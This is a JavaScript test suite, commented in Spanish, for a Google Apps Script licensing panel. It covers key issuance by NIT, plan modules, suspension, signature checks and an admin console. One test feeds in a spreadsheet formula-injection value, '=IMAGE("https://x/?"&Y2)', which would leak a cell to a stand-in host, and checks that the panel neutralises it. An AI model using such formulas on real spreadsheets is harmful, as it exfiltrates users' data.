// Pruebas del panel de proveedor (instalacion/PanelProveedor.gs) con una hoja simulada,
// y de que la llave que emite la acepta una instalación real (simulador).
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const { crear } = require('./simulador.js');
let ok = 0, mal = 0;
const t = (n, f) => { try { f(); ok++; console.log('  ✓ ' + n); } catch (e) { mal++; console.log('  ✗ ' + n + '\n   ' + (e.stack || e).split('\n').slice(0, 3).join('\n   ')); } };
const assert = (c, m) => { if (!c) throw new Error(m || 'falló'); };
const eq = (a, b, m) => { if (a !== b) throw new Error((m || '') + ' esperado ' + JSON.stringify(b) + ' y llegó ' + JSON.stringify(a)); };

function panel() {
  const props = {}, filas = [], hojas = {}, cache = {};
  const hoja = (nombre) => ({
    getName: () => nombre, getLastRow: () => filas.length, getLastColumn: () => (filas[0] || []).length, getMaxRows: () => 1000,
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => ((filas[r - 1 + i] || [])[c - 1 + j] ?? ''))),
      setValues: (v) => { v.forEach((fila, i) => { filas[r - 1 + i] = filas[r - 1 + i] || []; fila.forEach((x, j) => { filas[r - 1 + i][c - 1 + j] = x; }); }); },
      getValue: () => (filas[r - 1] || [])[c - 1] ?? '', setValue: (x) => { filas[r - 1] = filas[r - 1] || []; filas[r - 1][c - 1] = x; },
      getNumRows: () => nr, setFontWeight() { return this; }, setBackground() { return this; }, setFontColor() { return this; }, setWrap() { return this; }, setDataValidation() { return this; }, insertCheckboxes() { return this; }, setNumberFormat() { return this; }
    }),
    appendRow: (r) => { filas.push(r.slice()); }, setFrozenRows() { }, setFrozenColumns() { }, setRowHeight() { }, setColumnWidths() { }, setColumnWidth() { }, setName() { }
  });
  const G = {
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] ?? null, setProperty: (k, v) => { props[k] = v; } }) },
    Utilities: {
      getUuid: () => crypto.randomUUID(), base64EncodeWebSafe: (s) => Buffer.from(String(s), 'utf8').toString('base64url'),
      computeDigest: (alg, t) => [...crypto.createHash('sha256').update(String(t), 'utf8').digest()].map((b) => (b > 127 ? b - 256 : b)), DigestAlgorithm: { SHA_256: 1 }, Charset: { UTF_8: 1 }, sleep() { },
      computeHmacSha256Signature: (s, k) => [...crypto.createHmac('sha256', k).update(s, 'utf8').digest()].map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, z, f) => { const p = new Date(d.getTime() - (z === 'UTC' ? 0 : 5 * 3600e3)).toISOString(); return f === 'yyyy-MM-dd' ? p.slice(0, 10) : p.slice(0, 10) + ' ' + p.slice(11, 16); }
    },
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: (n) => (n === 'Clientes' ? (hojas.c = hojas.c || hoja('Clientes')) : null), insertSheet: (n) => hoja(n) }), getUi: () => { throw new Error('sin interfaz'); }, newDataValidation: () => ({ requireValueInList() { return this; }, build() { } }) },
    LockService: { getScriptLock: () => ({ waitLock() { }, tryLock: () => true, releaseLock() { } }) },
    ContentService: { MimeType: { JSON: 1 }, createTextOutput: (x) => ({ x, setMimeType() { return this; } }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] ?? null, put: (k, v) => { cache[k] = v; } }) },
    UrlFetchApp: {}, ScriptApp: {}, MailApp: {}, Session: {}, HtmlService: {}
  };
  const codigo = fs.readFileSync(path.join(__dirname, '..', 'instalacion', 'PanelProveedor.gs'), 'utf8');
  const S = new Function(...Object.keys(G), codigo + ';return { doPost, onEdit, calcularTodo, COLS, C, M0, clave_, consola, consolaEntrar, sha_, prop_ };')(...Object.values(G));
  filas.push(S.COLS.slice());
  const secretos = {};
  const post = (d, otro) => { const datos = JSON.stringify(d), nit = String(d.nit || '').replace(/\D/g, ''); const sec = otro || (secretos[nit] = secretos[nit] || crypto.randomBytes(32).toString('hex'));
    const firma = crypto.createHmac('sha256', sec).update(datos).digest('hex'); return JSON.parse(S.doPost({ postData: { contents: JSON.stringify({ datos, firma, registro: sec }) } }).x); };
  return { S, filas, post, props };
}

t('una empresa nueva aparece sola en el panel y sin plan no recibe llave', () => {
  const P = panel(), r = P.post({ nit: '900.123.456-7', empresa: 'Montajes', version: '1.8.0', personas: 12, enlace: 'https://x/#/c/1' });
  assert(!r.llave && /no ha asignado/.test(r.mensaje), 'sin plan no hay llave'); eq(P.filas.length, 2);
  eq(String(P.filas[1][P.S.C['NIT']]).replace(/\D/g, ''), '9001234567'); eq(P.filas[1][P.S.C['Versión']], '1.8.0'); eq(P.filas[1][P.S.C['Personas activas']], 12);
  assert(/^Nueva/.test(P.filas[1][P.S.C['Estado']]), 'queda marcada como nueva');
});
t('al elegir plan se marcan sus módulos; las casillas se pueden cambiar y la llave las respeta', () => {
  const P = panel(); P.post({ nit: '9001234567', empresa: 'Montajes', version: '1.8.0', personas: 5 });
  const fila = P.filas[1], C = P.S.C;
  fila[C['Plan']] = 'profesional'; P.S.onEdit({ value: 'profesional', range: { getSheet: () => ({ getName: () => 'Clientes', getRange: (r, c, nr, nc) => ({ setValues: (v) => v[0].forEach((x, j) => { fila[c - 1 + j] = x; }), getValue: () => fila[c - 1], setValue: (x) => { fila[c - 1] = x; } }) }), getRow: () => 2, getColumn: () => C['Plan'] + 1 } });
  eq(fila[C['Nómina']], true); eq(fila[C['Kiosco']], false); eq(fila[C['Personas máx.']], 80); assert(/^\d{4}-\d\d-\d\d$/.test(fila[C['Vence (AAAA-MM-DD)']]), 'pone vencimiento a 30 días');
  fila[C['Kiosco']] = true; fila[C['Préstamos']] = false; fila[C['Vence (AAAA-MM-DD)']] = '2027-12-31';
  const r = P.post({ nit: '9001234567', version: '1.8.0', personas: 6 }); assert(r.llave, 'ahora sí recibe llave');
  const datos = JSON.parse(Buffer.from(r.llave.split('.')[0], 'base64url').toString());
  assert(datos.modulos.includes('kiosco') && !datos.modulos.includes('prestamos'), 'la llave trae las casillas marcadas'); eq(datos.nit, '9001234567');

  // La instalación de la empresa acepta esa llave (misma clave) y aplica exactamente esos módulos
  const E = crear({ proveedor: { clave: P.S.clave_(), panel: 'https://panel' }, fetch: () => ({ getResponseCode: () => 200, getContentText: () => JSON.stringify(r) }) });
  const api = E.api, d = (r) => { assert(r.ok, r.e + ': ' + r.m); return r.d; };
  E.S.ahora(new Date('2026-11-20T08:00:00-05:00').toISOString()); E.S.instalar();
  const adm = d(api('registro', { cedula: '79000001', codigo: E.props.CODIGO_ADMIN, clave: 'secreta1', nombre: 'Ana Admin', salario: 5000000, consentimiento: { datos: true, sensibles: true } })).token;
  d(api('adminConfigGuardar', { empresa: { nombre: 'Montajes', nit: '900.123.456-7' } }, adm));
  d(api('adminLicenciaSincronizar', {}, adm)); // al guardar el NIT ya se reportó y aplicó la llave
  const yo = d(api('yo', {}, adm)); assert(yo.licencia.modulos.includes('kiosco') && !yo.licencia.modulos.includes('prestamos'), JSON.stringify(yo.licencia.modulos));
});
t('una empresa suspendida deja de recibir llave', () => {
  const P = panel(); P.post({ nit: '9001234567', empresa: 'X' }); const f = P.filas[1], C = P.S.C;
  f[C['Plan']] = 'basico'; f[C['Asistencia']] = true; f[C['Vence (AAAA-MM-DD)']] = '2027-12-31';
  assert(P.post({ nit: '9001234567' }).llave, 'activa'); f[C['Suspendida']] = true;
  const r = P.post({ nit: '9001234567' }); assert(!r.llave && /suspendida/.test(r.mensaje), 'suspendida'); eq(f[C['Estado']], 'Suspendida');
});
t('un tercero con un NIT ajeno no recibe la llave ni cambia los datos; las fórmulas no entran', () => {
  const P = panel(); P.post({ nit: '9001234567', empresa: 'Montajes', version: '1.8.0', personas: 5 }); const f = P.filas[1], C = P.S.C;
  f[C['Plan']] = 'basico'; f[C['Asistencia']] = true; f[C['Vence (AAAA-MM-DD)']] = '2027-12-31';
  const r = P.post({ nit: '9001234567', empresa: 'X', version: '0.0.1', personas: 1 }, crypto.randomBytes(32).toString('hex'));
  assert(!r.llave && r.error, 'rechazado: ' + JSON.stringify(r)); eq(f[C['Versión']], '1.8.0');
  P.post({ nit: '800111222', empresa: '=IMAGE("https://x/?"&Y2)', contacto: '+57 300', version: '1.8.0' });
  assert(String(P.filas[2][C['Empresa']]).startsWith("'="), 'fórmula neutralizada'); assert(String(P.filas[2][C['Correo']]).startsWith("'+"), 'contacto neutralizado');
});
t('consola web: pide contraseña, agrega empresa con plan, renueva y la llave le llega en su reporte', () => {
  const P = panel(); const { S } = P;
  let err = ''; try { S.consola('x', 'datos'); } catch (e) { err = e.message; } eq(err, 'SESION', 'sin sesión no entra');
  P.props.CONSOLA = 'sal:' + S.sha_('salclave1234');
  err = ''; try { S.consolaEntrar('mala'); } catch (e) { err = e.message; } assert(/incorrecta/.test(err));
  const tk = S.consolaEntrar('clave1234');
  let d = S.consola(tk, 'guardar', { nueva: true, nit: '900123456', empresa: 'Obras SAS', plan: 'profesional', max: 80, vence: '2030-01-31', modulos: { nomina: true, permisos: true } });
  const e = d.empresas.find((x) => x.nit === '900123456'); eq(e.estado, 'Activa'); eq(e.modulos.asistencia, true, 'asistencia siempre'); eq(e.modulos.kiosco, false);
  d = S.consola(tk, 'renovar', { nit: '900123456', meses: 1 }); eq(d.empresas[0].vence, '2030-02-28', 'renueva desde el vencimiento');
  const r = P.post({ nit: '900123456', empresa: 'Obras SAS', version: '1.8.0', personas: 12 }); assert(r.llave, 'su reporte recibe la llave');
  d = S.consola(tk, 'datos'); eq(d.empresas.length, 1, 'no duplica al reportar'); eq(d.empresas[0].conectada, 'Sí');
  err = ''; try { S.consola(tk, 'guardar', { nueva: true, nit: '12', plan: 'basico' }); } catch (x) { err = x.message; } assert(/NIT/.test(err));
});

console.log(`Panel: ${ok} pruebas correctas, ${mal} con error`); process.exit(mal ? 1 : 0);
